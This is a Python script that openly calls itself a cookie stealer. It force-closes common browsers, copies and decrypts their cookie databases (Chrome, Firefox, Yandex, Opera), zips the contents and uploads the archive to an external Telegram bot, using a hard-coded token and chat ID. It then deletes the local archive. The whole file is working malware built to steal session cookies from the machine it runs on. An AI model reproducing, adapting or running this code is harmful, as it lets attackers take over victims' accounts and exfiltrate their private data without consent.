import os
import sqlite3
import json
import base64
import zipfile
import requests
import tempfile
import shutil
import logging
import subprocess
from win32crypt import CryptUnprotectData

# Настройка логов
logging.basicConfig(
    filename='cookie_debug.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def kill_browsers():
    browsers = [
        'chrome.exe', 'firefox.exe', 'opera.exe',
        'browser.exe', 'yandex.exe', 'msedge.exe'
    ]
    for browser in browsers:
        subprocess.call(['taskkill', '/F', '/IM', browser], stderr=subprocess.DEVNULL)

def get_chrome_cookies(path):
    try:
        temp_db = tempfile.mktemp()
        shutil.copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for host, name, encrypted_val in cursor.fetchall():
            decrypted = CryptUnprotectData(encrypted_val)[1]
            cookies.append(f"{host}\tTRUE\t/\t{name}\t{base64.b64encode(decrypted).decode()}")
        logging.info(f"Chrome: Found {len(cookies)} cookies")
        return cookies
    except Exception as e:
        logging.error(f"Chrome error: {str(e)}")
        return []

def get_firefox_cookies(profile_path):
    try:
        path = os.path.join(profile_path, 'cookies.sqlite')
        temp_db = tempfile.mktemp()
        shutil.copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value FROM moz_cookies")
        cookies = [f"{host}\tTRUE\t/\t{name}\t{value}" for host, name, value in cursor.fetchall()]
        logging.info(f"Firefox: Found {len(cookies)} cookies")
        return cookies
    except Exception as e:
        logging.error(f"Firefox error: {str(e)}")
        return []

def get_yandex_cookies():
    path = os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Network', 'Cookies')
    return get_chrome_cookies(path) if os.path.exists(path) else []

def get_opera_cookies():
    path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Network', 'Cookies')
    return get_chrome_cookies(path) if os.path.exists(path) else []

def create_archive(cookies):
    temp_dir = tempfile.mkdtemp()
    for i, data in enumerate(cookies):
        with open(os.path.join(temp_dir, f'cookies_{i}.txt'), 'w', encoding='utf-8') as f:
            f.write("\n".join(data))
    zip_path = os.path.join(os.environ['TEMP'], 'cookies_archive.zip')
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for file in os.listdir(temp_dir):
            zipf.write(os.path.join(temp_dir, file), file)
    shutil.rmtree(temp_dir)
    return zip_path

def send_to_telegram(zip_path, token, chat_id):
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(zip_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': chat_id})
        logging.info("Archive sent to Telegram")
    except Exception as e:
        logging.error(f"Telegram error: {str(e)}")

if __name__ == "__main__":
    logging.info("=== COOKIE STEALER STARTED ===")
    kill_browsers()
    logging.info("Browsers terminated")
    
    all_cookies = []
    # Chrome
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    if os.path.exists(chrome_path):
        all_cookies.append(get_chrome_cookies(chrome_path))
    
    # Firefox
    firefox_profiles = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefox_profiles):
        for profile in os.listdir(firefox_profiles):
            if '.default' in profile:
                all_cookies.append(get_firefox_cookies(os.path.join(firefox_profiles, profile)))
    
    # Yandex
    yandex_cookies = get_yandex_cookies()
    if yandex_cookies:
        all_cookies.append(yandex_cookies)
    
    # Opera
    opera_cookies = get_opera_cookies()
    if opera_cookies:
        all_cookies.append(opera_cookies)
    
    if not any(all_cookies):
        logging.warning("No cookies found!")
    else:
        archive = create_archive(all_cookies)
        BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
        CHAT_ID = "1962231620"
        
        send_to_telegram(archive, BOT_TOKEN, CHAT_ID)
        os.unlink(archive)
    
    logging.info("=== OPERATION COMPLETE ===")
